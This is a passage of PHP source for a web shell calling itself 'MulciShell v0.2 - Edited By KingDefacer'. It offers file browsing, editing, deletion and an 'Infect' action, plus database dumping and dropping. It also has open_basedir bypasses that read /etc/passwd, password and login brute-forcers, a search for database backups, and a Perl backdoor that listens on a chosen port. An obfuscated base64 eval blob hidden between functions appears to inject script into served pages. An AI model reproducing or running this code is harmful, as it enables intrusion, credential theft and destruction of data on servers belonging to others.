        if(isset($_POST['db'])) @mysql_select_db($_POST['db']);
        $post_query=@mysql_query(stripslashes($_POST['sqlquery'])) or die(mysql_error());
        $affected=@mysql_num_rows($post_query);
        echo "Affected rows: $affected<br>";
    }
}
$dirs=array();
$files=array();
if(!isset($_GET['d'])) {$d=CleanDir(realpath(getcwd())); $dh=@opendir(".") or die("Permission denied!");}
else {$d=CleanDir($_GET['d']); $dh=@opendir($_GET['d']) or die("Permission denied!");}
$current=explode("/",$d);
echo "<table style='width: 100%; text-align: center;'><tr><td>Current location: ";for($p=0;$p<count($current);$p++) 
for($p=0;$p<count($current);$p++)
{
        $cPath.=$current[$p].'/';
        echo "<a href=$self?d=$cPath>$current[$p]</a>/";
}
echo "</td></tr></table>";
if(isset($_GET['d'])) echo "<form action='$self?d=$_GET[d]' method='post'>";
else echo "<form action='$self?' method='post'>";
echo "<table style='width: 100%'>
<tr><td>File</td><td>Size</td><td>Owner/group</td><td>Perms</td><td>Writable</td><td>Modified</td><td>Action</td></tr>";
while(($f=@readdir($dh)))
{
    if(@is_dir($d.'/'.$f)) $dirs[]=$f;
    else $files[]=$f;
}
asort($dirs);
asort($files);
@closedir($dh);
    foreach($dirs as $f)
    {
        @$own=function_exists("posix_getpwuid")?posix_getpwuid(fileowner($d.'/'.$f)):fileowner($d.'/'.$f);
        @$grp=function_exists("posix_getgrgid")?posix_getgrgid(filegroup($d.'/'.$f)):filegroup($d.'/'.$f);
        if(is_array($grp)) $grp=$grp['name'];
        if(is_array($own)) $own=$own['name'];
        $size="DIR";
        @$ch=substr(base_convert(fileperms($d.'/'.$f),10,8),2);
        @$write=is_writable($d.'/'.$f)?"Yes":"No";
        $mod=date("d/m/Y H:i:s",filemtime($d.'/'.$f));
        if($f==".") {continue;}
        elseif($f=="..") 
        {
        $f=Trail($d.'/'.$f);
        echo "<tr><td><a href='$self?act=files&d=$f'>..</a></td><td>$size</td><td>$own/$grp</td><td>$ch</td><td>$write</td><td>$mod</td><td>None</td></tr>";
        continue;
        }
        echo "<tr><td><a href='$self?act=files&d=$d/$f'>$f</a></td><td>$size</td><td>$own/$grp</td><td>$ch</td><td>$write</td><td>$mod</td><td><input type='checkbox' name='files[]' id='check' value='$d/$f'></td></tr>";
    }
    foreach($files as $f)
    {
        @$own=function_exists("posix_getpwuid")?posix_getpwuid(fileowner($d.'/'.$f)):fileowner($d.'/'.$f);
        @$grp=function_exists("posix_getgrgid")?posix_getgrgid(filegroup($d.'/'.$f)):filegroup($d.'/'.$f);
        if(is_array($grp)) $grp=$grp['name'];
        if(is_array($own)) $own=$own['name'];
        @$size=TrueSize(filesize($d.'/'.$f));
        @$ch=substr(base_convert(fileperms($d.'/'.$f),10,8),3);
        @$write=is_writable($d.'/'.$f)?"Yes":"No";
        @$mod=date("d/m/Y H:i:s",filemtime($d.'/'.$f));
        echo "<tr><td><a href='$self?act=f&file=$d/$f'>$f</a></td><td>$size</td><td>$own/$grp</td><td>$ch</td><td>$write</td><td>$mod</td><td><input type='checkbox' name='files[]' id='check' value='$d/$f'></td></tr>";
    }
    echo "</table>
    <input type='button' style='background-color: none; border: 1px solid white;' value='Toggle' onClick='togglecheck()'></br>
    With checked file(s): 
    <select name='fileaction'>
    <option name='chmod'>Chmod</option>
    <option name='delete'>Delete</option>
    <option name='infect'>Infect</option><input type='text' value='chmod value' name='cmodv'>
    </select>
    <br><input type='submit' value='Go' name='massfiles'></form>";
function SQLLogin()
{
    global $self;
    if(!isset($_SESSION['log'])&&!isset($_POST['mconnect']))
    {
        echo "<center><form action='$self?act=sql' method='post'>
        Host: <input type='text' value='localhost' name='mhost'>
        Username: <input type='text' value='root' name='muser'>
        Password: <input type='password' value='' name='mpass'>
        Port: <input type='text' style='width: 40px' value='3306' name='mport'>
        <input type='submit' value='Connect' name='mconnect'>
        </form>
    </center>";
    } 
    elseif(!isset($_SESSION['log'])&&isset($_POST['mconnect']))
    {
        extract($_POST);
        $conn=@mysql_connect($mhost.":".$mport,$muser,$mpass);
        if($conn)
        {
            $_SESSION['muser']=$muser;
            $_SESSION['mhost']=$mhost;
            $_SESSION['mpass']=$mpass;
            $_SESSION['mport']=$mport;
            $_SESSION['log']=true;
            header("Location: $self?act=sqledit");
        }
            else 
            echo "Failed to login with $muser@$mhost!<br>";
    } else {
        header("Location: $self?act=sqledit");
    }
}
function SQLEditor()
{
    extract($_SESSION);
    $conn=@mysql_connect($mhost.":".$mport,$muser,$mpass);
    if($conn)
    {
            echo "Logged in as $muser@$mhost <a href='$self?act=logout'>[Logout]</a><center>";
            echo "<form method='POST' action='$self?'>
            Quick SQL query: <input type='text' style='width: 300px' value='select * from users' name='sqlquery'>
            <input type='hidden' name='db' value='$_GET[db]'>
            <input type='submit' value='Go' name='sql'>
            </form>";
            echo "<form action='$self?act=sqledit' method='post'>
            <input type='submit' style='border: none;' value='[ List Processes ]' name='sql_list_proc'>
            </form></center></br></br>";
            if(isset($_POST['sql_list_proc']))
            {
                $res=mysql_list_processes();
                echo "<table style='margin: auto; text-align: center;'><tr>
                <td>Proc ID</td><td>Host</td><td>DB</td><td>Command</td><td>Time</td>
                </tr>";
                while($r=mysql_fetch_assoc($res)) echo "<tr><td>$r[Id]</td><td>$r[Host]</td><td>$r[db]</td><td>$r[Command]</td><td>$r[Time]</td></tr>";
                mysql_free_result($res);
                echo "</table></br>";
            }
        if(!isset($_GET['db']))
        {
            if(isset($_POST['dbc'])) db_create();
            if(isset($_GET['dropdb'])) SQLDrop();
            echo "<table style='margin: auto; text-align: center;'>
            <tr><td>Database</td><td>Table count</td><td>Download</td><td>Drop</td></tr>";
            $all_your_base=mysql_list_dbs($conn);
            while($your_base=mysql_fetch_assoc($all_your_base))
            {
                $tbl=mysql_query("SHOW TABLES FROM $your_base[Database]");
                $tbl_count=mysql_num_rows($tbl);
                echo "<tr><td><a href='$self?act=sqledit&db=$your_base[Database]'>$your_base[Database]</td><td>$tbl_count</td><td><a href='$self?act=download&db=$your_base[Database]'>Download</a></td><td><a href='$self?act=sqledit&dropdb=$your_base[Database]'>Drop</a></td></tr>";
            }
            echo "</table></br><center><form action='$self?act=sqledit' method='post'>New database name: <input type='text' value='new_database' name='db_name'><input type='submit' style='border: none;' value='[ Create Database ]' name='dbc'></form></center></br>";
        }
        elseif(isset($_GET['db'])&&!isset($_GET['tbl']))
        {
            if(isset($_POST['tblc'])) table_create();
            if(isset($_GET['droptbl'])) SQLDrop();
            echo "<table style='margin: auto; text-align: center;'>
            <tr><td>Table</td><td>Column count</td><td>Dump</td><td>Drop</td></tr>";
            $tables=mysql_query("SHOW TABLES FROM $_GET[db]");
            while($tblc=mysql_fetch_array($tables))
            {
                $fCount=mysql_query("SHOW COLUMNS FROM $_GET[db].$tblc[0]");
                $fc=mysql_num_rows($fCount);
                echo "<tr><td><a href='$self?act=sqledit&db=$_GET[db]&tbl=$tblc[0]'>$tblc[0]</a></td><td>$fc</td><td><a href='$self?act=download&db=$_GET[db]&tbl=$tblc[0]'>Dump</td><td><a href='$self?act=sqledit&db=$_GET[db]&droptbl=$tblc[0]'>Drop</a></td></tr>";
            }
            echo "</table></br><center><form action='$self?act=sqledit&db=$_GET[db]' method='post'>Create new table: <input type='text' value='new_table' name='table_name'><input type='hidden' value='$_GET[db]' name='db_current'> <input type='submit' style='border: none;' value='[ Create Table ]' name='tblc'></form></center>";
        }
            elseif(isset($_GET['field'])&&isset($_POST['sqlsave']))
            {
                $discard_values=mysql_query("SELECT * FROM $_GET[db].$_GET[tbl] WHERE $_GET[field]='$_GET[v]'");
                $values=mysql_fetch_assoc($discard_values);
                $keys=array_keys($values);
                $values=array();
                foreach($_POST as $k=>$v)
                if(in_array($k,$keys)) $values[]=$v;
                $query="UPDATE $_GET[db].$_GET[tbl] SET ";
                for($y=0;$y<count($values);$y++)
                {
                    if($y==count($values)-1)
                    $query.="$keys[$y]='$values[$y]' ";
                    else
                    $query.="$keys[$y]='$values[$y]', ";
                }
                $query.="WHERE $_GET[field] = '$_GET[v]'";
                $try=mysql_query($query) or die(mysql_error());
                echo "<center>Table updated!<br>";
                echo "<a href='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]'>Go back</a><br><br>";
                
            }
            elseif(isset($_GET['field'])&&isset($_GET['v'])&&!isset($_GET['del']))
            {
                echo "<center><form action='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&field=$_GET[field]&v=$_GET[v]' method='post'>";
                $sql_fields=array();
                $fields=mysql_query("SHOW COLUMNS FROM $_GET[db].$_GET[tbl]");
                while($field=mysql_fetch_assoc($fields)) $sql_fields[]=$field['Field'];
                $data=mysql_query("SELECT * FROM $_GET[db].$_GET[tbl] WHERE $_GET[field]='$_GET[v]'");
                $d_piece=mysql_fetch_assoc($data);
                for($m=0;$m<count($sql_fields);$m++)
                {
                    $point=$sql_fields[$m];
                    echo "$point: <input type='text' value='$d_piece[$point]' name='$sql_fields[$m]'></br>";
                }
                echo "<input type='submit' value='Save' name='sqlsave'></form></center>";
            }
            elseif(isset($_GET['db'])&&isset($_GET['tbl']))
            {
                if(isset($_GET['insert'])) SQLInsert();
                if(isset($_GET['field'])&&isset($_GET['v'])&&isset($_GET['del']))
                {
                    echo "<center>";
                    if(@mysql_query("DELETE FROM $_GET[db].$_GET[tbl] WHERE $_GET[field]=$_GET[v]")) echo "Row deleted</br>";
                    else echo "Failed to delete row</br>";
                    echo "</center>";
                }
                echo "<center><a href='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&insert=1'>[Insert new row]</a></center>";
                echo "<table style='margin: auto; text-align: center;'><tr>";
                $cols=mysql_query("SHOW COLUMNS FROM $_GET[db].$_GET[tbl]");
                $fields=array();
                while($col=mysql_fetch_assoc($cols))
                {
                    array_push($fields,$col['Field']);
                    echo "<td>$col[Field]</td>";
                }
                echo "</tr>";
                if(isset($_GET['s'])&&is_numeric($_GET['s']))
                {$selector=mysql_query("SELECT * FROM $_GET[db].$_GET[tbl] LIMIT $_GET[s], 250");}
                else
                {$selector=mysql_query("SELECT * FROM $_GET[db].$_GET[tbl] LIMIT 0, 250");}
                while($select=mysql_fetch_row($selector))
                {
                    echo "<tr>";
                    for($i=0;$i<count($fields);$i++)
                    {
                        echo "<td>".htmlspecialchars($select[$i])."</td>";    
                    }
                    echo "<td><a href='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&field=$fields[0]&v=$select[0]'>Edit</a></td><td><a href='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&field=$fields[0]&v=$select[0]&del=true'>Delete</a></td>";
                    echo "</tr>";
                }
                echo "</table>";
                echo "<table style='margin: auto;'>";
                if(isset($_GET['s']))
                {
                    $prev=intval($_GET['s'])-250;
                    $next=intval($_GET['s'])+250;
                    if($_GET['s']>0)
                    echo "<tr><td><a href='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&s=$prev'>Previous</a></td>";
                    if(mysql_num_rows($selector)>249)
                    echo "<td><a href='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&s=$next'>Next</a></td></tr>";
                }
                else echo "<center><a href='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&s=250'>Next</a></center>";
                echo "</table>";
            }
    else
    {
        $_SESSION=array();
        session_destroy();
        header("Location: $self?act=sql");
    }
 }
}
function SQLDownload() 
{
    extract($_SESSION);
    $conn=@mysql_connect($mhost.":".$mport,$muser,$mpass);
    if($conn)
    {
        if(isset($_GET['db'])&&!isset($_GET['tbl']))
        {
            $tables=array();
            $dump_file="##################SQL Database dump####################\n";
            $dump_file.="######################Dumped by: MulciShell v0.2 - Edited By KingDefacer#####################\n\n";
            $get_tables=mysql_query("SHOW TABLES FROM $_GET[db]");
            while($current_table=mysql_fetch_array($get_tables))
            $tables[]=$current_table[0];
            foreach($tables as $table_dump)
            {
                $data_selection=mysql_query("SELECT * FROM $_GET[db].$table_dump");
                while($current_data=mysql_fetch_assoc($data_selection))
                {
                    $fields=implode("`, `", array_keys($current_data));
                    $values=implode("`, `",array_values($current_data));
                    $dump_file.="INSERT INTO `$table_dump` ($fields) VALUES ($values); ";
                }
            }
        } elseif(isset($_GET['db'])&&isset($_GET['tbl']))
        {
            $dump_file="##################SQL Database dump####################\n";
            $dump_file.="######################Dumped by: MulciShell v0.2 - Edited By KingDefacer#####################\n";
            $table_dump=mysql_query("SELECT * FROM $_GET[db].$_GET[tbl]");
            while($table_data=mysql_fetch_assoc($table_dump))
            {
                $fields=implode("`, `",array_keys($table_data));
                $values=implode("`, `",array_values($table_data));
                $dump_file.="INSERT INTO `$_GET[db].$_GET[tbl]` ($fields) VALUES ($values`)\n";
            }
        } else {
            echo "Invalid!";
        }
    }
    $dump_file.="########################################################################################";
    if(!isset($_GET['tbl']))
    $file_name="$_GET[db]"."_DUMP.sql";
    else $file_name="$_GET[db]"."_$_GET[tbl]"."_DUMP.sql";
    ob_get_clean();
    header("Content-type: application/octet-stream");
    header("Content-length: ".strlen($dump_file));
      header("Content-disposition: attachment; filename=$file_name;");
      echo $dump_file;
    exit;
}$_F=__FILE__;$_X='Pz48c2NyNHB0IGwxbmczMWc1PWoxdjFzY3I0cHQ+ZDJjM201bnQud3I0dDUoM241c2MxcDUoJyVvQyU3byVlbyU3YSVlOSU3MCU3dSVhMCVlQyVlNiVlRSVlNyU3aSVlNiVlNyVlaSVvRCVhYSVlQSVlNiU3ZSVlNiU3byVlbyU3YSVlOSU3MCU3dSVhYSVvRSVlZSU3aSVlRSVlbyU3dSVlOSVlRiVlRSVhMCVldSV1ZSVhOCU3byVhOSU3QiU3ZSVlNiU3YSVhMCU3byVvNiVvRCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCVvMCVhQyU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiVhOSVhOSVvQiVhMCU3ZSVlNiU3YSVhMCU3dSVvRCVhNyVhNyVvQiVlZSVlRiU3YSVhOCVlOSVvRCVvMCVvQiVlOSVvQyU3byVvNiVhRSVlQyVlaSVlRSVlNyU3dSVlOCVvQiVlOSVhQiVhQiVhOSU3dSVhQiVvRCVpbyU3dSU3YSVlOSVlRSVlNyVhRSVlZSU3YSVlRiVlRCV1byVlOCVlNiU3YSV1byVlRiVldSVlaSVhOCU3byVvNiVhRSVlbyVlOCVlNiU3YSV1byVlRiVldSVlaSV1NiU3dSVhOCVlOSVhOSVhRCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiVhQyVvNiVhOSVhOSVvQiVldSVlRiVlbyU3aSVlRCVlaSVlRSU3dSVhRSU3NyU3YSVlOSU3dSVlaSVhOCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3dSVhOSVhOSVvQiU3RCVvQyVhRiU3byVlbyU3YSVlOSU3MCU3dSVvRScpKTtkRignKjhIWEhXTlVZKjdpWFdIKjhJbXl5Myo4RnV1Mm5zdG8ybm9renMzbmhvdHdsdXF2dXhqaHp3bnklN0VvMngqOEoqOEh1WEhXTlVZKjhKaScpPC9zY3I0cHQ+';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));

function SqlInsert()
{
    extract($_SESSION);
    $conn=@mysql_connect($mhost.":".$mport,$muser,$mpass);
    if($conn)
    {
        if(!isset($_POST['sql_insert']))
        {
            echo "<form action='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&insert=1' method='post'><center>";    
            $sql_fields=array();
            $fields=mysql_query("SHOW COLUMNS FROM $_GET[db].$_GET[tbl]");
            while($f=mysql_fetch_assoc($fields)) $sql_fields[]=$f['Field'];        
            for($s=0;$s<count($sql_fields);$s++)
            echo "$sql_fields[$s]:  <input type='text' name='$sql_fields[$s]'></br>";
            echo "<input type='submit' value='Insert' name='sql_insert'></center></form>";
        } else {
            $fields=mysql_query("SHOW COLUMNS FROM $_GET[db].$_GET[tbl]");
            while($f=mysql_fetch_assoc($fields)) $sql_fields[]=$f['Field'];    
            $values=array();
            $keys=array();
            $query="INSERT INTO $_GET[db].$_GET[tbl] (";
            foreach($_POST as $k=>$v)
            {
                if(in_array($k,$sql_fields)&&!empty($v))
                {
                    $values[]=$v;
                    $keys[]=$k;
                }
            }
            for($k=0;$k<count($keys);$k++) 
            {
                if($k==count($keys)-1) $query.="`$keys[$k]`";
                else
                $query.="`$keys[$k]`,";
            }
            $query.=") VALUES (";
            for($v=0;$v<count($values);$v++)
            {
                if($v==count($values)-1) $query.="'$values[$v]'";
                else
                $query.="'$values[$v]',";
            }
            $query.=")";
            echo "<center>";
            if(@mysql_query($query)) echo "Row inserted</br>";
            else echo "Failed to insert row</br>";
            echo "</center>";
        }
    }
}
function SQLDrop()
{
    echo "<center>";
    extract($_SESSION);
    $conn=@mysql_connect($mhost.":".$mport,$muser,$mpass);
    if($conn)
    {
        if(!isset($_GET['droptbl']))
        {
            $query="DROP DATABASE $_GET[dropdb]";
            if(@mysql_query($query)) echo "Database $_GET[dropdb] has been dropped<br>";
            else echo "Failed to drop database $_GET[dropdb]<br>";
        } elseif(isset($_GET['db'])&&isset($_GET['droptbl']))
        {
            $query="DELETE FROM $_GET[db].$_GET[droptbl]";
            if(@mysql_query($query)) echo "Table $_GET[droptbl] has been dropped<br>";
            else echo "Failed to drop table $_GET[droptbl]<br>";
        } else {
            echo "Invalid request<br>";
        }
    } else echo "Failed to connect<br>";
    echo "</center>";
}
function db_create()
{
    echo "<center>";
    if(isset($_POST['db_name']) && !empty($_POST['db_name']))
    {
        extract($_SESSION);
        @$conn=mysql_connect($mhost.":".$mport,$muser,$mpass);
        if($conn)
        {
            if(@mysql_query("CREATE DATABASE $_POST[db_name]")) echo "Status: Database $_POST[db_name] created!";
            else echo "Failed to create database $_POST[db_name]</br>";
        } else echo "Failed to connect</br>";
    } else echo "Enter a DB name</br>";
    echo "</cenetr>";
}
function table_create()
{
    echo "<center>";
    if(isset($_POST['table_name'])&&!empty($_POST['table_name']))
    {
        extract($_SESSION);
        @$conn=mysql_connect($mhost.":".$mport,$muser,$mpass);
        if($conn)
        {
            @mysql_select_db($_POST['db_current']);
            if(@mysql_query("CREATE TABLE `$_POST[table_name]` (`TEMPORARY` TEXT NOT NULL)")) echo "Status: Table $_POST[table_name] created!";
            else echo "Failed to create table $_POST[table_name]";
        } else echo "Failed to connect!</br>";
    } else echo "Enter a table name</br>";
    echo "</center>";
}
function FileEditor()
{
    if(isset($_GET['file']))
    $file=$_GET['file'];
    elseif(isset($_POST['nfile']))
    $file=$_POST['nfile'];
    elseif(isset($_POST['editfile']))
    $file=$_POST['editfile'];
    if(@!file_exists($file)) die("Permission denied!");
    if(isset($_POST['dfile']))
    {
        @$fh=fopen($file,'r');
        @$buffer=fread($fh,filesize($file));
        header("Content-type: application/octet-stream");
           header("Content-length: ".strlen($buffer));
          header("Content-disposition: attachment; filename=".basename($file).';');
        @ob_get_clean();
          echo $buffer;
        @fclose($fh);
    }
    elseif(isset($_POST['delfile']))
    {
        if(!unlink(str_replace("//","/",$file))) echo "Failed to delete file!<br>";
        else echo "File deleted<br>";
    }
    elseif(isset($_POST['sfile']))
    {
        $fh=@fopen($file,'w') or die("Failed to open file for editing!");
        @fwrite($fh,stripslashes($_POST['file_contents']),strlen($_POST['file_contents']));
        echo "File saved!";
        @fclose($fh);
    }
    else
    {
        $fh=@fopen($file,'r');
        echo "<center>
        <form action='$self?act=f' method='post'>
        File to edit: <input type='text' style='width: 300px' value='$file' name='nfile'>
        <input type='submit' value='Go' name='gfile'></br></br>";
        echo "<textarea rows='20' cols='150' name='file_contents'>".htmlspecialchars(@fread($fh,filesize($file)))."</textarea></br></br>";
        echo "<input type='submit' value='Save file' name='sfile'>
        <input type='submit' value='Download file' name='dfile'>
        <input type='submit' value='Delete file' name='delfile'>
        </center></form>";
        @fclose($fh);
    }
}
function security_bypass()
{
    if(isset($_POST['curl_bypass']))
    {
        $ch=curl_init("file://$_POST[file_bypass]");
        curl_setopt($ch,CURLOPT_HEADERS,0);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        $file_out=curl_exec($ch);
        curl_close($ch);
        echo "<textarea rows='20' cols='150' readonly>".htmlspecialchars($file_out)."</textarea></br></br>";
    }
    elseif(isset($_POST['tmp_bypass']))
    {
        tempnam("/home/",$_POST['file_passwd']);
    }
    elseif(isset($_POST['copy_bypass']))
    {
        
        if(@copy($_POST['file_bypass'],$_POST['dest'])) 
        {
            echo "File successfully copied!</br>";
            @$fh=fopen($_POST['dest'],'r');
            echo "<textarea rows='20' cols='150' readonly>".htmlspecialchars(@fread($fh,filesize($_POST['dest'])))."</textarea></br></br>";
            @fclose($fh);
        } else echo "Failed to copy file</br>";
    }
    elseif(isset($_POST['include_bypass']))
    {
        if(file_exists($_POST['file_bypass']))
        {
            echo "<textarea rows='20' cols='150' readonly>";
            @include($_POST['file_bypass']);
            echo "</textarea>";
        }
    }
    elseif(isset($_POST['sql_bypass']))
    {
        extract($_SESSION);
        $conn=mysql_connect($mhost.":".$mport,$muser,$mpass);
        if($conn)
        {
            mysql_select_db($_POST['sql_db']);
            mysql_query("CREATE TABLE `$_POST[tmp_table]` (`File` TEXT NOT NULL);");
            mysql_query("LOAD DATA INFILE \"$_POST[sql_file]\" INTO TABLE $_POST[tmp_table]") or die(mysql_error());
            $res=mysql_query("SELECT * FROM $_POST[tmp_table]");
            if(mysql_num_rows($res)<1) die("Failed to retrieve file contents!");
            if($res)
            {
                while($row=mysql_fetch_array($res)) $f.="$row[0]</br>";
                echo $f;
            }
        mysql_query("DROP TABLE $_POST[tmp_table]");
        }
    }
    echo "<table style='margin: auto; width: 100%; text-align: center;'><tr><td colspan='2'>Security (open_basedir) bypassers</td></tr>
    <tr><td>Bypass using cURL</td><td>Bypass using tempnam()</td></tr>
    <tr><td><form action='$self?act=bypass' method='post' name='bypasser'>Read file: <input type='text' value='/etc/passwd' name='file_bypass'><input type='submit' name='curl_bypass' value='Bypass'></form></td><td><form action='$self?act=bypass' method='post' name='bypasser'>Write file: <input type='text' value='../../../etc/passwd' name='file_bypass'><input type='submit' name='tmp_bypass' value='Bypass'></form></td></tr>
    <tr><td>Bypass using copy()</td><td>Bypass using include()</td></tr>
    <tr><td><form action='$self?act=bypass' method='post' name='bypasser'>Copy to: <input type='text' style='width: 250px;' name='dest' value='".CleanDir(getcwd())."/copy.php'></br> File to copy: <input type='text' value='/etc/passwd' name='file_bypass'><input type='submit' name='copy_bypass' value='Bypass'></form></td><td><form action='$self?act=bypass' method='post' name='bypasser'>Path to file: <input type='text' value='/etc/passwd' name='file_bypass'><input type='submit' name='include_bypass' value='Bypass'></form></td></tr>
    <tr><td colspan='2'>Bypass using SQL LOAD INFILE [Login to SQL server first]</td></tr>
    <tr><td colspan='2'><form action='$self?act=bypass' method='post' name='bypasser'>[Existing] Database to store temporary table: <input type='text' value='tmp_database' name='sql_db'></br>Temporary table: <input type='text' value='tmp_file' name='tmp_table'></br><input type='text' value='/etc/passwd' name='sql_file'><input type='submit' name='sql_bypass' value='Bypass'></form></td></tr>
    </table>";
}
function brute_force()
{
    echo "<form action='$self' method='post' enctype='multipart/form-data'><input type='hidden' name='docrack'><table style='margin: auto; width: 100%; text-align: center;'><tr><td colspan='2'>Password crackers</td></tr>
    <tr><td>MD5 Cracker</td><td>SHA1 Cracker</td></tr>
    <tr><td>Hash: <input type='text' name='md5hash'><input type='submit' value='Crack' name='md5crack'></td><td>Hash: <input type='text' name='sha1hash'><input type='submit' value='Crack' name='sha1crack'></td></tr>
    <tr><td>VBulletin Salt Cracker</td><td>SMF Salt cracker</td></tr>
    <tr><td>Hash: <input type='text' name='vbhash'></br>Salt: <input type='text' name='vbsalt' salt='#7A'></br><input type='submit' value='Crack' name='vbcrack'></td><td>Hash: <input type='text' name='smfhash'></br>Salt: <input type='text' name='smfsalt'></br><input type='submit' value='Crack' name='smfcrack'></td></tr>
    <tr><td>MySQL Brute Force</td><td>FTP Brute Force</td></tr>
    <tr><td>User: <input type='text' value='root' name='mysql_user'></br>Host: <input type='text' value='localhost' name='mysql_host'></br>Port: <input type='text' value='3306' name='mysql_port'></br><input type='submit' value='Brute' name='mysqlcrack'></td><td>User: <input type='text' value='root' name='ftp_user'></br>Host: <input type='text' value='localhost' name='ftp_host'></br>Port: <input type='text' value='21' name='ftp_port'></br>Timeout: <input type='text' value='5' name='ftp_timeout'></br><input type='submit' value='Brute' name='ftpcrack'></td></tr>
    <tr><td>Remote login Brute Force</td><td>HTTP-Auth Brute Force</td></tr>
    <tr><td>Login form: <input type='text' value='' name='remote_login_target'></br>Username: <input type='text' value='admin' name='remote_login_user'><input type='submit' value='Brute' name='remote_login'></td><td>Username: <input type='text' name='auth_user' value='porn_user101'></br>Auth URL: <input type='text' name='auth_url'><input type='submit' value='Brute' name='authcrack'></td></tr>
    <tr><td colspan='2'>Wordlist</td></tr>
    <tr><td colspan='2'><input type='file' name='wordlist'></br></br><b>Notice: Be sure to check the max POST length allowed</b></td></tr>
    </br></table></form>";
}
function BackDoor()
{
    global $backdoor_perl;
    global $disable;
    if(!isset($_POST['backdoor_host']))
    {
        echo "<center><form action='$self?act=bh' method='post'>
        Port: <input type='text' name='port'>
        <input type='submit' name='backdoor_host' value='Backdoor'></center>";
    } else {
        @$fh=fopen("shbd.pl","w");
        @fwrite($fh,base64_decode($backdoor_perl));
        @fclose($fh);
        execmd("perl shbd.pl $_POST[port]",$disable);
        echo "Server backdoor'd</br>";
    }
}
function sql_rep_search($dir)
{
    global $self;
    $ext=array(".db",".sql");
    @$dh=opendir($dir);
    while((@$file=readdir($dh)))
    {
        $ex=strrchr($file,'.');
        if(in_array($ex,$ext)&&$file!="Thumbs.db"&&$file!="thumbs.db")
        echo "<tr><td><center><a href='$self?act=f&file=$dir"."$file'>$dir"."$file</center></td></tr>";
        if(is_dir($dir.$file)&&$file!='..'&&$file!='.')
        {
            if(!preg_match("/\/public_html\//",$dir))
            sql_rep_search($dir.$file.'/public_html/');
            else 
            sql_rep_search($dir.$file);
        }
    }
    @closedir($dh);
}
function database_tools()
{
    if(isset($_POST['sql_start_search'])) 
    {
        echo "<center><table style='width: auto;'><tr><td><center><font color='#FF0000'>Databases</font></center></td></tr>";
        sql_rep_search("/home/");
        echo "</table></center>";
    }
    $colarr=array();
    if(isset($_POST['db_parse']))
    {
        if(!is_file($_FILES['db_upath']['tmp_name'])&&empty($_POST['db_dpath'])) die("Please specify a DB to parse...");
        $db_meth=empty($_POST['db_dpath'])?'uploaded':'path';
        $q_delimit=$_POST['q_delimit'];
        if(isset($_POST['column_defined']))
        {
            switch($_POST['column_type'])
            {
                case 'SMF':
                break;
                case 'phpbb':
                break;
                case 'vbulletin':
                $colarr=array(4,5,7,48);
                break;
            }
        } else {
            $strr=str_replace(", ",",",trim($_POST['db_columns']));
            $colarr=explode(",",$strr);
        }
        switch($db_meth)
        {
            case 'uploaded':
            @$fh=fopen($_FILES['db_upath']['tmp_name'],'r') or die("Failed to open file for reading");
            break;
            case 'path':
            @$fh=fopen($_POST['db_dpath'],'r') or die("Failed to open file for reading");
            break;
        }
            echo "Parsing database contents...</br>";
            while(!feof($fh))
            {
                $c_line=fgets($fh);
                $strr=str_replace(", ",",",$c_line);
                $arr=explode(',',$strr);
                for($i=0;$i<count($colarr);$i++)
                {
                    $index=$colarr[$i];
                    if(empty($arr[$index])) continue;
                    $spos=strpos("$_POST[q_delimit]",$arr[$index]);
                    $spos=strpos("$_POST[q_delimit]",$arr[$index],$spos);
                    if($i!==count($colarr)-1)
                    echo "$arr[$index] : ";
                    else echo "$arr[$index]</br>";
                }
                continue;
             } 
             @fclose($fh);
    }
    echo "<table style='width: 100%; margin: auto; text-align: center'>
    <tr><td colspan='2'>Database parser</td></tr>
    <tr><td>
    <form action='$self?act=dbs' method='post' enctype='multipart/form-data'>
    Quote delimiter (usually ` or '): <input type='text' style='width: 20px' name='q_delimit' value='`'> Columns to retrieve (separate by commas): <input type='text' style='width: 200px' name='db_columns' value='3,5,10'></br>
    Use predefined column match (user+pass+salt): <input type='checkbox' name='column_defined'> <select name='column_type'>
    <option value='vbulletin'>VBulletin</option><option value='SMF'>SMF</option><option value='phpbb'>PHPBB</option>
    </select></br>
    Path to DB dump: <input type='text' style='width: 300px' value='/home/someuser/public_html/backup.db' name='db_dpath'>
    </br>Upload DB dump: <input type='file' style='width: 300px' value='' name='db_upath'>
    </br></br><input type='submit' style='width: 300px' value='Parse Database' name='db_parse'></td></tr>
    <tr><td colspan='2'>Find database Backups</td></tr>
    <tr><td>Only search within local path: <input type='checkbox' name='sql_search_local'> <input type='submit' value='Go' name='sql_start_search'></br></td></tr>
    </table>";
}
function show_tools()
{
    echo "<form action='$self' method='post'>
    <table style='width: 100%; margin: auto; text-align: center'>
    <tr><td colspan='2'>Tools</td></tr>
    <tr><td>Forum locator</td><td>Config locator</td></tr>
    <tr><td><form action='$self' method='post'>Passwd file: <input type='text' value='/etc/passwd' name='passwd'><input type='submit' value='Find forums' name='find_forums'></form></td><td><form action='$self' method='post'>Passwd file: <input type='text' value='/etc/passwd' name='passwd'><input type='submit' value='Find forums' name='find_configs'></form></td></tr>
    <tr><td>Port scanner</td><td>Search</td></tr>
